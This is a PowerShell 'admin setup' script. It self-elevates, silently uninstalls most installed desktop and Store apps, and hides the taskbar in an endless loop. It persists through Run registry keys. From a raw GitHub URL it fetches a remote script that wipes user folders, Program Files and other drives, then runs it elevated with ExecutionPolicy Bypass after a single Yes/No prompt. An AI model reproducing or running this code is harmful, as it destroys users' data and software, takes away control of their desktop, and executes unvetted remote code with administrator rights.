<#
.SYNOPSIS
  Remove removable apps, hide the taskbar, show three badges. Trash reruns the disk wipe.
#>
[CmdletBinding()]
param(
  [switch]$SkipWipe,
  [switch]$SkipTray,
  [switch]$ShowReport,
  [ValidateSet('All','HideBar','Badges')]
  [string]$Mode = 'All'
)
Set-StrictMode -Version 1
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

function Get-Prop {
  param($Object, [string]$Name)
  if ($null -eq $Object) { return $null }
  $prop = $Object.PSObject.Properties[$Name]
  if ($prop) { return $prop.Value }
  return $null
}
function Get-SelfPath {
  foreach ($candidate in @($PSCommandPath, (Get-Prop $MyInvocation.MyCommand 'Path'), (Get-Prop $MyInvocation.MyCommand 'Definition'))) {
    if ($candidate -and $candidate -like '*.ps1' -and (Test-Path -LiteralPath $candidate)) { return $candidate }
  }
  return $null
}
function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  return (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
function Test-NameLike([string]$Name, [string[]]$Patterns) {
  if ([string]::IsNullOrWhiteSpace($Name)) { return $false }
  foreach ($pattern in $Patterns) { if ($Name -like $pattern) { return $true } }
  return $false
}

if ($Mode -eq 'HideBar') {
  $mutex = New-Object System.Threading.Mutex($false, 'Local\AdminSetupHideTaskbar')
  if (-not $mutex.WaitOne(0, $false)) { return }
  Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class TrayHide {
  [DllImport("user32.dll", CharSet=CharSet.Auto)] public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
  [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
  [DllImport("user32.dll")] public static extern bool EnableWindow(IntPtr hWnd, bool enable);
  [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
  public static void HideAll() {
    HideOne(FindWindow("Shell_TrayWnd", null));
    HideOne(FindWindow("Shell_SecondaryTrayWnd", null));
    HideOne(FindWindow("NotifyIconOverflowWindow", null));
  }
  static void HideOne(IntPtr hwnd) {
    if (hwnd == IntPtr.Zero) return;
    ShowWindow(hwnd, 0);
    EnableWindow(hwnd, false);
    SetWindowPos(hwnd, IntPtr.Zero, 0, 0, 0, 0, 0x0080 | 0x0001 | 0x0002 | 0x0004);
  }
}
'@
  while ($true) { try { [TrayHide]::HideAll() } catch {}; Start-Sleep -Milliseconds 400 }
  return
}

if ($Mode -eq 'Badges') {
  $mutex = New-Object System.Threading.Mutex($false, 'Local\AdminSetupFolderLogo')
  if (-not $mutex.WaitOne(0, $false)) { return }
  Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase, System.Drawing
  function Convert-ToBitmapSource([System.Drawing.Image]$Img) {
    if (-not $Img) { return $null }
    $ms = New-Object System.IO.MemoryStream
    $Img.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
    $ms.Position = 0
    $bmp = New-Object System.Windows.Media.Imaging.BitmapImage
    $bmp.BeginInit(); $bmp.CacheOption = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
    $bmp.StreamSource = $ms; $bmp.EndInit(); $bmp.Freeze(); $ms.Dispose(); return $bmp
  }
  function Get-ExeImage([string]$Path) {
    try { $ico = [System.Drawing.Icon]::ExtractAssociatedIcon($Path); if ($ico) { return Convert-ToBitmapSource $ico.ToBitmap() } } catch { return $null }
  }
  $script:WipeFile = Join-Path $env:USERPROFILE 'admin\Wipe-All-Except-Windows.ps1'
  $xaml = @'
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" Title="Launch" WindowStyle="None" AllowsTransparency="True" Background="Transparent" ShowInTaskbar="False" Topmost="True" ResizeMode="NoResize" SizeToContent="WidthAndHeight">
  <StackPanel Orientation="Horizontal" Margin="8,8,8,10">
    <Grid Width="64" Height="64" Margin="0,0,18,0" Cursor="Hand" Name="BtnFolder">
      <Ellipse Fill="#FF2A2A2A" Stroke="#FFE6B422" StrokeThickness="2.2"/>
      <Image Name="ImgFolder" Width="30" Height="30"/>
    </Grid>
    <Grid Width="64" Height="64" Margin="0,0,18,0" Cursor="Hand" Name="BtnPs">
      <Ellipse Fill="#FF172233" Stroke="#FF3B9AE1" StrokeThickness="2.2"/>
      <Image Name="ImgPs" Width="30" Height="30"/>
    </Grid>
    <Grid Width="64" Height="64" Cursor="Hand" Name="BtnScript">
      <Ellipse Fill="#FF14301F" Stroke="#FF3DDC84" StrokeThickness="2.2"/>
      <Viewbox Width="30" Height="30"><Canvas Width="48" Height="48">
        <Path Fill="#FF3DDC84" Data="M 10,16 L 38,16 L 36,42 L 12,42 Z"/>
        <Path Fill="#FF0E1C14" Data="M 18,16 L 18,42 M 24,16 L 24,42 M 30,16 L 30,42" Stroke="#FF0E1C14" StrokeThickness="2"/>
        <Path Fill="#FF3DDC84" Data="M 8,12 L 40,12 L 40,16 L 8,16 Z"/>
        <Path Fill="#FF3DDC84" Data="M 18,6 L 30,6 L 32,12 L 16,12 Z"/>
      </Canvas></Viewbox>
    </Grid>
  </StackPanel>
</Window>
'@
  $window = [Windows.Markup.XamlReader]::Parse($xaml)
  $window.FindName('ImgFolder').Source = (Get-ExeImage (Join-Path $env:SystemRoot 'explorer.exe'))
  $window.FindName('ImgPs').Source = (Get-ExeImage (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'))
  function Move-ToBottom {
    $window.Left = [Math]::Max(0, ([System.Windows.SystemParameters]::PrimaryScreenWidth - $window.ActualWidth) / 2)
    $window.Top = [System.Windows.SystemParameters]::PrimaryScreenHeight - $window.ActualHeight - 16
  }
  $window.FindName('BtnFolder').Add_MouseLeftButtonUp({ Start-Process explorer.exe $env:USERPROFILE | Out-Null })
  $window.FindName('BtnPs').Add_MouseLeftButtonUp({ Start-Process (Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe') | Out-Null })
  $window.FindName('BtnScript').Add_MouseLeftButtonUp({
    $answer = [System.Windows.MessageBox]::Show("Clear Downloads, user folders, Program Files, and all other drives?`nWindows folder is kept.`n`nContinue?", 'Confirm disk wipe', 'YesNo', 'Exclamation', 'No')
    if ($answer -ne [System.Windows.MessageBoxResult]::Yes) { return }
    $target = Join-Path $env:USERPROFILE 'admin\Wipe-All-Except-Windows.ps1'
    if (-not (Test-Path -LiteralPath $target)) {
      try {
        New-Item -ItemType Directory -Force -Path (Split-Path $target) | Out-Null
        Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Wipe-All-Except-Windows.ps1' -OutFile $target
      } catch {}
    }
    if (-not (Test-Path -LiteralPath $target)) {
      [System.Windows.MessageBox]::Show("Missing`n$target", 'Admin Setup') | Out-Null
      return
    }
    $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
    Start-Process -FilePath $ps -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$target`"",'-ConfirmPhrase','WIPE-ALL-DATA') | Out-Null
  })
  $window.Add_ContentRendered({ Move-ToBottom })
  $timer = New-Object System.Windows.Threading.DispatcherTimer
  $timer.Interval = [TimeSpan]::FromSeconds(3)
  $timer.Add_Tick({ $window.Topmost = $true; Move-ToBottom })
  $timer.Start()
  [void]$window.ShowDialog()
  return
}

$homeRoot = Join-Path $env:USERPROFILE 'admin'
New-Item -ItemType Directory -Force -Path $homeRoot | Out-Null
$log = Join-Path $homeRoot 'Clear-Apps-And-Tray.log'
$script:ReportKept = New-Object System.Collections.Generic.List[string]
$script:ReportCleared = New-Object System.Collections.Generic.List[string]
$script:ReportFailed = New-Object System.Collections.Generic.List[string]
$script:ReportFound = 0
function Write-Log([string]$Message) {
  $line = '{0:yyyy-MM-dd HH:mm:ss} {1}' -f (Get-Date), $Message
  try { $line | Tee-Object -FilePath $log -Append } catch { Write-Host $line }
}
Write-Log 'Clear-Apps-And-Tray 20260919 trash disk wipe'

if (-not (Test-IsAdmin)) {
  $self = Get-SelfPath
  if (-not $self) { $self = $MyInvocation.MyCommand.Definition }
  $arg = @('-STA','-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
  if ($SkipWipe) { $arg += '-SkipWipe' }
  if ($SkipTray) { $arg += '-SkipTray' }
  if ($ShowReport) { $arg += '-ShowReport' }
  Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Verb RunAs -ArgumentList $arg | Out-Null
  return
}

function Invoke-UninstallCommand([string]$Command) {
  if ([string]::IsNullOrWhiteSpace($Command)) { return $false }
  if ($Command -match '(?i)explorer(\.exe)?') { return $false }
  try {
    if ($Command -match '\{([0-9A-Fa-f-]{36})\}') {
      $p = Start-Process -FilePath 'msiexec.exe' -ArgumentList @("/X{$($Matches[1])}", '/qn', '/norestart') -Wait -PassThru -WindowStyle Hidden
      return ($p.ExitCode -in 0, 1605, 1614, 1641, 3010)
    }
    $exe = $Command; $args = ''
    if ($Command -match '^"([^"]+)"\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    elseif ($Command -match '^(\S+)\s*(.*)$') { $exe = $Matches[1]; $args = [string]$Matches[2] }
    if ($exe -match '(?i)explorer(\.exe)?$' -or -not (Test-Path -LiteralPath $exe)) { return $false }
    if (("$args").ToLowerInvariant() -notmatch '/s\b|/silent|/quiet|/qn') { $args = ("$args /S /silent /quiet /norestart").Trim() }
    $p = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
    return ($null -eq $p.ExitCode -or $p.ExitCode -in 0, 1, 1605, 1614, 1641, 3010)
  } catch { return $false }
}
function Invoke-ClearWin32Apps {
  $protect = @('Microsoft Visual C++*','Microsoft Visual Studio* Redistributable*','Microsoft .NET*','Microsoft Edge*','Microsoft Edge WebView2*','Microsoft Update*','Windows PC Health Check*','Update for *','Security Update*','Hotfix*','Intel*','NVIDIA*','AMD*','Chipset*','Canon *','HP *','Printer*','Driver*','Windows Terminal*','Windows SDK*','Microsoft Windows*','Windows Malicious Software Removal*')
  $paths = @('HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*')
  $removed = 0
  foreach ($prog in @(Get-ItemProperty $paths -ErrorAction SilentlyContinue)) {
    $name = [string](Get-Prop $prog 'DisplayName')
    if (-not $name) { continue }
    $script:ReportFound++
    $systemComponent = Get-Prop $prog 'SystemComponent'
    if ($null -ne $systemComponent) { try { if ([int]$systemComponent -eq 1) { [void]$script:ReportKept.Add("system  $name"); continue } } catch {} }
    if (Test-NameLike $name $protect) { [void]$script:ReportKept.Add("keep    $name"); continue }
    $uninstall = [string](Get-Prop $prog 'QuietUninstallString')
    if (-not $uninstall) { $uninstall = [string](Get-Prop $prog 'UninstallString') }
    if (-not $uninstall) { [void]$script:ReportKept.Add("no-uninstaller  $name"); continue }
    if (Invoke-UninstallCommand $uninstall) { $removed++; [void]$script:ReportCleared.Add($name) } else { [void]$script:ReportFailed.Add($name) }
  }
  return $removed
}
function Invoke-ClearStoreApps {
  $keepAppx = @('Microsoft.WindowsStore','Microsoft.StorePurchaseApp','Microsoft.WindowsTerminal','MicrosoftWindows.Client*','Microsoft.Windows.*','Microsoft.UI.*','Microsoft.VCLibs*','Microsoft.Services.Store*','windows.immersivecontrolpanel','Microsoft.DesktopAppInstaller','Microsoft.SecHealthUI','Microsoft.MicrosoftEdge*','Microsoft.ECApp','Microsoft.LockApp','Microsoft.AAD.BrokerPlugin','Microsoft.AccountsControl','Microsoft.BioEnrollment','Microsoft.CredDialogHost','Microsoft.Win32WebViewHost','Microsoft.XboxGameCallableUI','Microsoft.PPIProjection')
  $removed = 0
  foreach ($pkg in @(Get-AppxPackage -AllUsers -ErrorAction SilentlyContinue)) {
    $name = [string]$pkg.Name
    if (-not $name) { continue }
    $script:ReportFound++
    if ($pkg.IsFramework -or $pkg.NonRemovable) { [void]$script:ReportKept.Add("store-system  $name"); continue }
    if (Test-NameLike $name $keepAppx) { [void]$script:ReportKept.Add("store-keep  $name"); continue }
    if ($name -like 'Microsoft.Windows.*' -or $name -like 'Windows.*') { [void]$script:ReportKept.Add("store-keep  $name"); continue }
    try { Remove-AppxPackage -Package $pkg.PackageFullName -AllUsers -ErrorAction SilentlyContinue; $removed++; [void]$script:ReportCleared.Add("Store: $name") }
    catch { try { Remove-AppxPackage -Package $pkg.PackageFullName -ErrorAction SilentlyContinue; $removed++; [void]$script:ReportCleared.Add("Store: $name") } catch { [void]$script:ReportFailed.Add("Store: $name") } }
  }
  return $removed
}
function Set-NoTaskbar {
  $path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
  New-Item -Path $path -Force | Out-Null
  foreach ($pair in @{ NoTrayItemsDisplay = 1; HideClock = 1; HideSCAHealth = 1; HideSCAMeetNow = 1; HideSCANetwork = 1; HideSCAVolume = 1; HideSCAPower = 1; NoAutoTrayNotify = 1; NoSetTaskbar = 1; NoTrayContextMenu = 1 }.GetEnumerator()) {
    try { New-ItemProperty -Path $path -Name $pair.Key -Value $pair.Value -PropertyType DWord -Force | Out-Null } catch {}
  }
  $self = Get-SelfPath
  if (-not $self) { return }
  $dest = Join-Path $homeRoot 'Clear-Apps-And-Tray.ps1'
  if ([IO.Path]::GetFullPath($self) -ne [IO.Path]::GetFullPath($dest)) { Copy-Item -LiteralPath $self -Destination $dest -Force }
  $wipe = Join-Path $homeRoot 'Wipe-All-Except-Windows.ps1'
  try { Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Wipe-All-Except-Windows.ps1' -OutFile $wipe } catch {}
  $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
  New-Item -Path $runKey -Force | Out-Null
  $ps = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  New-ItemProperty -Path $runKey -Name 'AdminSetupHideTaskbar' -Value "`"$ps`" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest`" -Mode HideBar" -PropertyType String -Force | Out-Null
  New-ItemProperty -Path $runKey -Name 'AdminSetupFolderLogo' -Value "`"$ps`" -STA -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$dest`" -Mode Badges" -PropertyType String -Force | Out-Null
  Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$dest`"",'-Mode','HideBar') | Out-Null
  Start-Process -FilePath $ps -WindowStyle Hidden -ArgumentList @('-STA','-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',"`"$dest`"",'-Mode','Badges') | Out-Null
}
function Show-WipeReport {
  Add-Type -AssemblyName System.Windows.Forms
  Add-Type -AssemblyName System.Drawing
  $lines = New-Object System.Collections.Generic.List[string]
  [void]$lines.Add("Clear-Apps-And-Tray  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')")
  [void]$lines.Add("Computer  $env:COMPUTERNAME    User  $env:USERNAME")
  [void]$lines.Add('')
  [void]$lines.Add("Found     $($script:ReportFound)")
  [void]$lines.Add("Cleared   $($script:ReportCleared.Count)")
  [void]$lines.Add("Kept      $($script:ReportKept.Count)")
  [void]$lines.Add("Failed    $($script:ReportFailed.Count)")
  [void]$lines.Add('')
  [void]$lines.Add('--- Cleared ---')
  if ($script:ReportCleared.Count -eq 0) { [void]$lines.Add('(none)') } else { $script:ReportCleared | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  [void]$lines.Add('')
  [void]$lines.Add('--- Failed ---')
  if ($script:ReportFailed.Count -eq 0) { [void]$lines.Add('(none)') } else { $script:ReportFailed | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  [void]$lines.Add('')
  [void]$lines.Add('--- Kept ---')
  if ($script:ReportKept.Count -eq 0) { [void]$lines.Add('(none)') } else { $script:ReportKept | Sort-Object | ForEach-Object { [void]$lines.Add($_) } }
  $text = $lines -join [Environment]::NewLine
  try { $text | Set-Content -Path (Join-Path $homeRoot 'Clear-Apps-And-Tray-last.txt') -Encoding UTF8 } catch {}
  $win = New-Object System.Windows.Forms.Form
  $win.Text = 'Admin Setup - what ran'
  $win.Size = New-Object System.Drawing.Size(720, 560)
  $win.StartPosition = 'CenterScreen'
  $win.TopMost = $true
  $box = New-Object System.Windows.Forms.TextBox
  $box.Multiline = $true; $box.ScrollBars = 'Both'; $box.ReadOnly = $true; $box.Dock = 'Fill'
  $box.Font = New-Object System.Drawing.Font('Consolas', 10)
  $box.BackColor = [System.Drawing.Color]::FromArgb(24,24,24)
  $box.ForeColor = [System.Drawing.Color]::FromArgb(220,220,220)
  $box.Text = $text
  $win.Controls.Add($box)
  [void]$win.ShowDialog()
}

$win32 = 0; $store = 0
if (-not $SkipWipe) { $win32 = Invoke-ClearWin32Apps; $store = Invoke-ClearStoreApps }
if (-not $SkipTray) { Set-NoTaskbar }
Write-Log "Finished Win32=$win32 Store=$store"
Show-WipeReport
